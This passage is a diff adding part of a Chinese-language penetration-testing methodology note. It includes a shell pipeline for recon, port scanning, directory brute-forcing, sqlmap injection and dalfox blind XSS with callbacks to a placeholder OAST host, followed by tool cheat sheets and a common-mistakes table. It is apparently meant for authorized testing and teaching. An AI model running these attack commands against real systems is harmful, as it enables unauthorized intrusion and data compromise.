+httpx -l $R/recon/subs.txt -sc -title -tech-detect -favicon -cdn -ip -threads 100 -o $R/recon/alive.txt
+grep -oE 'https?://[^ ]+' $R/recon/alive.txt | sort -u > $R/recon/alive_urls.txt
+grep -v '\[CDN\]' $R/recon/alive.txt | grep -oE '\[[0-9]{1,3}(\.[0-9]{1,3}){3}\]' | \
+    tr -d '[]' | sort -u > $R/recon/ips_direct.txt
+wafw00f -i $R/recon/alive_urls.txt -o $R/recon/waf.txt
+
+# ── 4. 端口扫描（只扫直连 IP）──
+sudo nmap -sS -p- --min-rate 2000 -T4 -iL $R/recon/ips_direct.txt -oA $R/scan/nmap_all
+
+# ── 5. URL 与接口面 ──
+gau --subs --blacklist png,jpg,css,woff $D | anew $R/recon/urls_all.txt
+katana -u $(head -1 $R/recon/alive_urls.txt) -jc -d 3 -aff | anew $R/recon/urls_all.txt
+grep "=" $R/recon/urls_all.txt | sort -u > $R/recon/urls_params.txt
+
+# ── 6. 目录爆破 ──
+ffuf -u https://$D/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+     -t 50 -rate 200 -mc 200,204,301,302,401,403 -ac -o $R/scan/ffuf.json
+
+# ── 7. 打洞 ──
+sqlmap -r $R/vuln/req.txt --batch --level 3 --risk 2          # SQLi
+dalfox file $R/recon/urls_params.txt --blind https://$OAST    # XSS
+interactsh-client -v                                          # 起 OAST
+# 手工：越权 / SSRF / 上传 / 命令注入 / 逻辑
+```
+
+**核心理念**：
+
+| 阶段 | 决定什么 |
+|---|---|
+| 1–2 资产面 | 效率上限（资产找全才有东西打） |
+| 3 接口面 | 准确度（接口参数捞全才知道往哪打） |
+| 4–5 漏洞 | 把已知手法套上去 |
+| 6 横向 | 把一次突破变成一片控制 |
+| 7 报告 | 把技术动作变成可交付结论 |
+
+---
+
+## 十、工具速查表
+
+| 阶段 | 工具 | 一句话 |
+|---|---|---|
+| 子域枚举 | subfinder | 多源被动，最快 |
+| | amass | 数据源最全，慢 |
+| | assetfinder | 极轻量，秒出 |
+| | puredns | 字典爆破 + 泛解析过滤 |
+| | gobuster dns | DNS 模式爆破 |
+| DNS 解析 | dnsx | 批量解析 + CNAME/PTR |
+| | dig / host | 单个查询 |
+| 存活指纹 | httpx | 批量状态码/标题/技术栈 |
+| | whatweb | 单目标精细指纹 |
+| | nmap | 端口 + 服务版本 |
+| | wafw00f | WAF 识别 |
+| | favicon hash | 找同类资产 |
+| URL 收集 | gau | 历史 URL |
+| | waybackurls | 历史 URL（单源） |
+| | katana | 主动爬虫，执行 JS |
+| | anew | 增量去重（胶水） |
+| 目录爆破 | ffuf | 主力，最灵活 |
+| | feroxbuster | 递归体验最好 |
+| | dirsearch | 字典与变形规则全 |
+| | gobuster | 简单稳定，三模式 |
+| SQL 注入 | sqlmap | 全自动 + tamper 绕过 |
+| XSS | dalfox | 自动化探测 + 盲打 |
+| | XSStrike | 带 WAF 绕过引擎 |
+| SSRF/盲打 | interactsh-client | 免费 OAST 服务器 |
+| 抓包代理 | Burp Suite | 抓包改包 + 插件生态 |
+| | Autorize 插件 | 自动化越权检测 |
+| | Turbo Intruder | 精确并发控制 |
+| 提权 | linpeas / winPEAS | 枚举脚本 |
+| | gtfobins | 查 SUID 程序提权用法 |
+| 内网 | fscan | 内网快速扫描 |
+| 隧道 | chisel / frp / neoreg | 内网穿透 |
+| 数据处理 | jq | JSON 提取 |
+| | proxychains4 | 代理链 |
+
+---
+
+## 十一、Kali 预装情况说明
+
+| 工具 | Kali 预装 | 说明 |
+|---|---|---|
+| nmap / whatweb / sqlmap / ffuf / gobuster / dirb | ✅ | 开箱即用 |
+| wafw00f / feroxbuster / john / hashcat | ✅ | 开箱即用 |
+| burpsuite | ✅ | **Community 版，无 Scanner** |
+| seclists / dnsutils / proxychains4 | ✅ | 字典与基础组件 |
+| hydra / medusa / netcat / socat | ✅ | |
+| amass | ⚠️ | 较新版本已移出默认安装 |
+| subfinder / httpx / katana / dnsx | ❌ | Go 系，需自装 |
+| interactsh-client / gau / assetfinder / waybackurls | ❌ | Go 系，需自装 |
+| anew / dalfox / puredns / fscan / chisel | ❌ | Go 系，需自装 |
+| dirsearch / xsstrike | ❌ | pip（用 pipx 绕 PEP 668） |
+| neoreg | ❌ | Python 脚本 |
+| linpeas / winPEAS | ❌ | 下载即用，无依赖 |
+| jq | ❌ | `sudo apt install jq` |
+
+**Burp 社区版 vs 专业版**：社区版有抓包改包 / Repeater / Intruder（限速），**没有 Scanner（自动漏洞扫描）**，部分插件受限。
+
+**OAST 替代方案**：`interactsh-client`（免费）、`webhook.site`（网页版手动）、Burp Collaborator（专业版）。
+
+---
+
+## 十二、常见错误清单
+
+| 错误 | 后果 | 正确做法 |
+|---|---|---|
+| `cut -d' ' -f5` 从 httpx 输出提 IP | 加 `-title` 后字段位置漂移，提到垃圾数据 | 用 `grep -oE` 正则，或 `-json` + `jq` |
+| nmap 直接扫域名解析出的 IP | 扫到 CDN 边缘节点，信息全假且 IP 被封 | 先判断 CNAME，过滤掉 CDN 的 IP |
+| `subfinder` 不加 `-silent` | 日志混进结果文件 | 管道场景一律加 `-silent` |
+| 子域爆破不过滤泛解析 | 结果里几千条假数据 | 用 puredns，或先 `dig random123456.域` 验证 |
+| `ffuf` 不加 `-ac` | 自定义 404 页面被全判为"存在" | 加 `-ac` 或 `-fs` 按长度过滤 |
+| `ffuf -rate` 不设或设太高 | 目标被打挂 / 你的 IP 被封 | 公网 `-rate 200` 以内 |
+| `--risk 3` 打生产库 | 可能触发 UPDATE，改坏数据 | 生产库最高 `--risk 2` |
+| `proxychains` 里用 `nmap -sS` | 扫不动（只代理 TCP） | 用 `-sT -Pn` |
+| `go install` 后不配 PATH | 一律 `command not found` | 加 `~/go/bin` 到 PATH |
+| 新版 Kali 直接 `pip install` | 报 `externally-managed-environment` | 用 `pipx install` |
+| 看到 403 就跳过 | 漏掉资产 | 403 说明路径存在，试路径/Header 绕过 |
+| 只看页面回显判盲注 | 漏掉所有盲打漏洞 | 用延时 + OAST 外带验证 |
+| 扫描器结果直接用 | 大量误报消耗信任 | 每条人工复核并给出最小重放包 |
+| 同时改多个变量测试 | 出差异不知道哪个起作用 | 一次只改一个变量 |
+
+---
+
+*本笔记为方法论整理，所有目标标识符均为占位符。实际测试须在明确授权范围内进行。*
